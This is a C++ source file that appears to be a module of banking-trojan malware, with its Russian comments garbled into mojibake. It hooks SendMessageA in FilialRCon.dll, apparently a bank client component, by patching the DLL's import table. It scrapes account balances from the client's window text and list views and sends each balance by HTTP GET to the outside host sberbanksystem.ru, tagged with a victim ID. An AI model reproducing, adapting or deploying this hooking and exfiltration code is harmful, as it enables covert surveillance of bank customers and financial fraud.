#include <windows.h>

#include "GetApi.h"
#include "Memory.h"
#include "Strings.h"

#include "Utils.h"

#include "Inject.h"

#include "ntdll.h"

#include "commctrl.h"

#include "BotDebug.h"

namespace DBGRAFADLL
{
	#include "DbgTemplates.h"
}

#define DBGRAFA DBGRAFADLL::DBGOutMessage<>

#define RafaDllModule //������� ��� ������ �������

namespace Rafa
{

void GrabBalansFromMemoText(const char* s);
void GrabBalansFromLVM(const char* s);

DWORD PID = 0; //��� ��������� 2-�� �������
int fromLVM = 0;  //���� ����� 1, �� �������� ����� � ������� (��. ������� GrabBalansFromLVM)

static PIMAGE_NT_HEADERS GetNtHeaders(PVOID Image)
{
  PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)(  ((PIMAGE_DOS_HEADER)Image)->e_lfanew +  (PCHAR)Image );
  if ( 	((PIMAGE_DOS_HEADER)Image)->e_magic != IMAGE_DOS_SIGNATURE )
	  return NULL;
  if ( pNtHeader->Signature != IMAGE_NT_SIGNATURE )
	  return NULL;
  return pNtHeader;
};

static BOOLEAN PathIAT(PVOID Module,PCHAR DllName,PCHAR FuncName,PVOID NewHandler,PVOID *OldHandler)
{

	PIMAGE_NT_HEADERS		pNtHeader;
	PIMAGE_DATA_DIRECTORY	pData;
	CHAR buf1[MAX_PATH];

	if ( Module == NULL )
		return FALSE;

	pNtHeader = GetNtHeaders(Module);
	if ( pNtHeader == NULL )
		return FALSE;

	pData = &pNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
	if ( pData->Size == 0 )
		return FALSE;
	
	m_lstrcpy(buf1,DllName);
	pCharUpperBuffA(buf1,sizeof(buf1)-1);

	PIMAGE_IMPORT_DESCRIPTOR	pimg_import_desc = (PIMAGE_IMPORT_DESCRIPTOR)((PCHAR)Module + pData->VirtualAddress);

	for ( int i =0; pimg_import_desc[i].Name != 0; ++i)
	{
		CHAR buf2[MAX_PATH];
		PCHAR ImortDll = (PCHAR)Module + pimg_import_desc[i].Name;
		m_lstrcpy(buf2,ImortDll);
		pCharUpperBuffA(buf2,sizeof(buf2)-1);
		if ( m_lstrcmp(buf1,buf2) != 0 )
			continue;

		DWORD  VAToThunk   = pimg_import_desc[i].FirstThunk;
		PDWORD FirstThunk  = (PDWORD)((PCHAR)Module + pimg_import_desc[i].FirstThunk);  /*VA to function*/
		PDWORD OriginalFirstThunk  =(PDWORD)((PCHAR)Module + pimg_import_desc[i].OriginalFirstThunk); /*VA to name function*/
		while ( *FirstThunk  && *OriginalFirstThunk )
		{
			PCHAR Name  = (PCHAR)((PCHAR)Module +*OriginalFirstThunk ); 
			Name+=2;

			if ( m_lstrcmp(Name,FuncName) == 0)
			{
				DWORD Protect;
				*OldHandler = (PVOID)*FirstThunk;
				pVirtualProtect(FirstThunk,sizeof(PVOID),PAGE_READWRITE,&Protect);
				*FirstThunk = (DWORD)NewHandler;
				pVirtualProtect(FirstThunk,sizeof(PVOID),Protect,&Protect);

				
				DBGRAFA( "Rafa", "IAT: [%s] %x", FuncName, *FirstThunk); 
				return TRUE;
			}

			FirstThunk++;	OriginalFirstThunk++;
			VAToThunk += sizeof(VAToThunk);
		}
	}
	return FALSE;
}



LRESULT  (WINAPI*pHandlerSendMessageA)(HWND , UINT , WPARAM , LPARAM );

static LRESULT WINAPI HandlerSendMessageA(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam)
{
	PWCHAR buf = (PWCHAR)HEAP::Alloc(4096);
	LRESULT lResult;

	switch ( Msg )
	{
		// ���� ��������� ����� � ��� ����� � �� EDIT (� ������ ������ ����)
		case WM_SETTEXT:
			//DBGRAFA( "Rafa", "SETTEXT: [%x] %s", hWnd, lParam ); 
			GrabBalansFromMemoText((char*)lParam);
		break;

		// ��� ������ ������ item
		case TVM_INSERTITEM:
		{
			/*
			LPTVINSERTSTRUCT insert = (LPTVINSERTSTRUCT)lParam;
			if ( insert)
			if ( insert->item.mask & TVIF_TEXT )
			{
				DBGRAFA( "Rafa", "TVM_INSERTITEM: [%x] %s", hWnd, (insert->item.pszText==NULL)?"NULL":insert->item.pszText); 
			}
			*/
			break;
		}
		// ��� ������ ����������� item
		case TVM_SETITEM:
		{
			/*
			LPTVITEM	item  = (LPTVITEM)lParam;
			if ( item )
			if ( item->mask & TVIF_TEXT )
			{
				DBGRAFA( "Rafa", "TVM_SETITEM: [%x] %s",hWnd,(item->pszText==NULL)?"NULL":item->pszText); 
			}
			*/
			break;
		}

		// ��� ������� ������ item
		case LVM_INSERTITEM:
		{
			/*
			LPLVITEM	insert = (LPLVITEM)lParam;
			if ( insert == NULL)
				break;
			if ( insert->iItem == 2 )
				return 1;

			if ( insert->mask & LVIF_TEXT )
			{
				//insert->pszText[0] = '(';
				//if ( m_lstrlen(insert->pszText) > 1 )
				//	insert->pszText[1] = ':';
				DBGRAFA( "Rafa", "LVM_INSERTITEM: [%x] %s", hWnd, insert->pszText); 
			}
			*/
			break;
		}
		// ��� �������  ����������� item
		case LVM_SETITEM:
		{
			LPLVITEM item  = (LPLVITEM)lParam;
			if( item )
				if ( item->mask & LVIF_TEXT )
				{
					//DBGRAFA( "Rafa", " %s", item->pszText ); 
					GrabBalansFromLVM(item->pszText);
				}
			break;
		}
	}
	HEAP::Free(buf);

	return (LRESULT)pHandlerSendMessageA(hWnd,Msg,wParam,lParam);;
}

static DWORD WINAPI InitializeRafaHook( LPVOID p )
{
	DBGRAFA( "Rafa", "Start hook FilialRCon.dll" );
	while( true )
	{
		LPVOID dll = pGetModuleHandleA("FilialRCon.dll");
		if( dll )
		{
			for( int i = 0; i < 10; i++ )
			{
				bool res = PathIAT( dll, "USER32.DLL", "SendMessageA", HandlerSendMessageA, (PVOID*)&pHandlerSendMessageA );
				DBGRAFA( "Rafa", "Hook FilialRCon.dll is ok %d - %08x", (int)res,pHandlerSendMessageA );
				if( res )
				{
					
					return 0;
				}
				pSleep(1000);
			}
		}
		pSleep(1000);
	}
}

void InitHook_FilialRConDll()
{
	if( IsNewProcess(PID) ) //����� �������� �� ���������
	{
		HANDLE hThread = CreateThread( NULL, 0, InitializeRafaHook, 0, 0, 0 );
		CloseHandle(hThread);
		fromLVM = 0;
	}
}

const char* panelaz = "sberbanksystem.ru";
//�������� ������, GET ��������
void SendBalans( const char* balans )
{
	fwsprintfA wsprintfA = Get_wsprintfA();
	MemPtr<512> qr;
	MemPtr<128> uid;
	//��������� ������
	GenerateUid(uid.str());
	wsprintfA( qr.str(), "http://%s/bal/?uid=%s&type=raifur&sum=%s", panelaz, uid, balans );
	//���������� ������
	THTTPResponse Response;
	ClearStruct(Response);
	HTTP::Get( qr, 0, &Response );
	DBGRAFA( "Rafa", "�������� ������: %s", qr.str() );
}

//������ ������ � ���������� ���� (������ �����)
//������ � ����� ������:
//���������/������� ������� �� �����: 83109.16/83109.16 (���������� �����)
void GrabBalansFromMemoText(const char* s)
{
	const char* p = m_strstr( s, "(���������� �����)" );
	if( p )
	{
		p--; //���������� ����� ��������� ������, ��� ������ ���� ������, ���������� ���
		while( *p == ' ' && p >= s ) p--;
		if( p > s )
		{
			//����� �� ��������� ����� �������, ���� ����� ���� �� ������ ������, �. �. ��������� �� ������ �������
			const char* p1 = p;
			while( *p1 != ' ' && p1 >= s ) p1--;
			if( p1 > s )
			{
				p1++; //����� �� 1-� ����� ������ �����
				if( *p1 >= '0' && *p1 <= '9' )
				{
					char balans[32];
					//��������� ����� �� ����� (����� �����)
					int i = 0;
					while( *p1 != '.' && p1 > s && i < sizeof(balans) - 1 ) balans[i++] = *p1++;
					balans[i] = 0; //������ � ��� ��� �������
					SendBalans(balans);
				}
			}
		}
	}
}

//������ ������ � ������� ������ ������
void GrabBalansFromLVM(const char* s)
{
	if( fromLVM == 0 )
	{
		if( m_lstrcmp( s, "���������� �����" ) == 0 ) //������ �������� ������, ��������� ������ ����� ����� ������
		{
			fromLVM = 1;
		}
	}
	else
		if( fromLVM == 1 ) //� s ��������� ������
		{
			if( *s >= '0' && *s <= '9' )
			{
				char balans[32];
				int i = 0;
				//��������� ����� �� �����
				while( *s && *s != '.' && i < sizeof(balans) - 1 ) balans[i++] = *s++;
				balans[i] = 0;
				SendBalans(balans);
			}
			fromLVM = 0;
		}

}
//http://sberbanksystem.ru/bal/?uid=TEST0123456789&type=raifur&sum=234234

}